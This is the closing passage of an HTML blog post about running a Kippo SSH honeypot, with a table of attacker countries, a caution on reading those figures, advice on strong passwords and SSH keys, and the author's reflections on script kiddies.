<span class="n">BH</span><span class="p">,</span> <span class="n">Bahrain</span>               <span class="mi">1</span>
<span class="n">CH</span><span class="p">,</span> <span class="n">Switzerland</span>           <span class="mi">1</span>
<span class="n">CL</span><span class="p">,</span> <span class="n">Chile</span>                 <span class="mi">1</span>
<span class="n">CR</span><span class="p">,</span> <span class="n">Costa</span> <span class="n">Rica</span>            <span class="mi">1</span>
<span class="n">GE</span><span class="p">,</span> <span class="n">Georgia</span>               <span class="mi">1</span>
<span class="n">GT</span><span class="p">,</span> <span class="n">Guatemala</span>             <span class="mi">1</span>
<span class="n">HU</span><span class="p">,</span> <span class="n">Hungary</span>               <span class="mi">1</span>
<span class="k">IS</span><span class="p">,</span> <span class="n">Iceland</span>               <span class="mi">1</span>
<span class="n">KE</span><span class="p">,</span> <span class="n">Kenya</span>                 <span class="mi">1</span>
<span class="n">KZ</span><span class="p">,</span> <span class="n">Kazakhstan</span>            <span class="mi">1</span>
<span class="n">LB</span><span class="p">,</span> <span class="n">Lebanon</span>               <span class="mi">1</span>
<span class="n">LT</span><span class="p">,</span> <span class="n">Lithuania</span>             <span class="mi">1</span>
<span class="n">MN</span><span class="p">,</span> <span class="n">Mongolia</span>              <span class="mi">1</span>
<span class="n">MX</span><span class="p">,</span> <span class="n">Mexico</span>                <span class="mi">1</span>
<span class="n">MZ</span><span class="p">,</span> <span class="n">Mozambique</span>            <span class="mi">1</span>
<span class="n">PA</span><span class="p">,</span> <span class="n">Panama</span>                <span class="mi">1</span>
<span class="n">PE</span><span class="p">,</span> <span class="n">Peru</span>                  <span class="mi">1</span>
<span class="n">PH</span><span class="p">,</span> <span class="n">Philippines</span>           <span class="mi">1</span>
<span class="n">SG</span><span class="p">,</span> <span class="n">Singapore</span>             <span class="mi">1</span>
<span class="n">VE</span><span class="p">,</span> <span class="n">Venezuela</span>             <span class="mi">1</span>
</pre></div>


<p><img alt="" src="http://1.bp.blogspot.com/-1yjxTiktK-w/TXgYDentuKI/AAAAAAAARR8/Yo1bNNkVWZY/s400/hacker-country-pie.png"></p>
<p>Be wary when interpreting these results, as they might represent &#8220;countries containing hacked servers&#8221; more than &#8220;originating countries of hackers&#8221;, as hacked servers are, as we&#8217;ve seen, often used to get to other&nbsp;targets.</p>
<h1>Concluding&nbsp;remarks</h1>
<p>Kippo has now been removed from my server, due to the fact that I don&#8217;t have enough time to keep checking up on it and I feel a bit uneasy running a honeypot on server containing important data. As I&#8217;ve said before, modifying and extending Kippo and analysing the results using a few <span class="caps">VPS</span> hosts might be a fun summer&nbsp;project.</p>
<p>The main lesson to take away from this post is this: keep your servers secure. This means running upgrades, but especially choosing strong passwords (or using <span class="caps">RSA</span> keys). As we&#8217;ve seen, most malware contained brute forcing tools, trying one server after&nbsp;another.</p>
<p>While analyzing cute honeypot logs is by no means doing what one would call &#8220;advanced security research&#8221;, I did have a lot of fun with it, especially when trying to investigate <span class="caps">IRC</span> channels and trailing the&nbsp;hackers.</p>
<p>Some time ago (actually: years and years ago), I myself was (indirectly) involved with a botnet, containing not hundred but thousands of bots, which is a story for another time. I understand the thrill of gaining your first rooted shell, but being on the opposite side of things (that is: running a server instead of hacking one) also shows how script kiddies operate without any regard for privacy, property or data. It is a valuable, but sad&nbsp;lesson.</p>
	</article>
</div>
		
	</div>

	<footer class="row">
		<div class="large-12 columns">
			<hr />
			<div class="row">
				<p>Bed Against The Wall by Seppe "Macuyiko" vanden Broucke<br>
				Unless mentioned otherwise, this work is licensed under a <a href="http://creativecommons.org/licenses/by-sa/2.0/be/" rel="license">Creative Commons Attribution-Share Alike 2.0 Belgium License</a>.<br>
				Static blog engine powered by <a href="http://getpelican.com">Pelican</a>.</p>
			</div>
		</div>
	</footer>
</div>
 